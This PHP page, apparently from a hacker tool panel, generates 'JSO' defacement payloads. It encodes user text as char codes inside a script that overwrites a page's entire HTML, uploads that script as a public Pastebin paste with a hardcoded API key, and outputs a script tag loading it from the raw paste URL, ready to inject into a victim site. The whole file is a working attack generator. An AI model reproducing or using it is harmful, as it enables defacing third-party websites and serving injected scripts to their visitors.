<?php
$judul=@JSO_Auto_Create;
include'sec.php';
error_reporting(0);
?>
<?php include 'helixdata/head.php'; 
?>
<body id="page-top">
<?php include 'helixdata/sidebar.php'; 
?>
<?php include 'helixdata/topcontent.php'; 
?>

 <!-- Begin Page Content -->
                <div class="container-fluid">
                    
<!-- Tools Card -->
                            <div class="card shadow mb-4">
                                <div class="card-header py-3">
                                    <center><h6 class="m-0 font-weight-bold text-primary"><?php echo str_replace("_", " ", "$judul"); ?></h6></center>
                                </div>
                                <br> <center>
  	<script>
    function runCharCodeAt() {
        input = document.charCodeAt.input.value;
        output = "";
        for(i=0; i<input.length; ++i) {
            if (output != "") output += ", ";
            output += input.charCodeAt(i);
        }
        document.charCodeAt.output.value = output;
    }
</script>
</head>
<body>
<center>
    <form name="charCodeAt" method="post">
        <textarea name="input" class="form-control text-dark" autocomplete="off" style="width:250px; height:150px;"placeholder="Fill in something here"></textarea><br><br>
        <input type="button" class="btn btn-outline-info" onclick="runCharCodeAt()" value="Convert Now!"><br><br>
        <textarea name="output" class="form-control text-dark" style="width:250px; height:150px;" readonly placeholder="Result Of Convert"></textarea><br><br>
        <input type="submit" class="btn btn-outline-info" name="submit" value="Submit">
    </form>
    <br><br>
<?php
 
if (isset($_POST['submit'])) {
    if (empty($_POST['output'])) {
        echo "<script>alert('Convert First');</script>";
    } else {
$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key            = '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
$api_paste_name         = $random; // name or title of your paste
$api_paste_expire_date      = 'N';
$api_paste_format       = 'text';
$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name         = urlencode($api_paste_name);
$api_paste_code         = urlencode($api_paste_code);
 
$url                = 'https://pastebin.com/api/api_post.php';
$ch                 = curl_init($url);
 
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_NOBODY, 0);
 
$response           = curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
$asu = '<script type="text/javascript" src="'.$hasil.'"></script>';
$kk = htmlspecialchars($asu);
echo "<br><textarea class='form-control text-dark' readonly style='width:250px; height:100px;'>". $kk ."</textarea>";
}
}
 
 ?><br>
</table></div>
<br>
	<br>
<br>
</center>

                                    </div>
                            </div>
                                
            <!-- End of Main Content -->
<?php include'helixdata/footer.php' ?>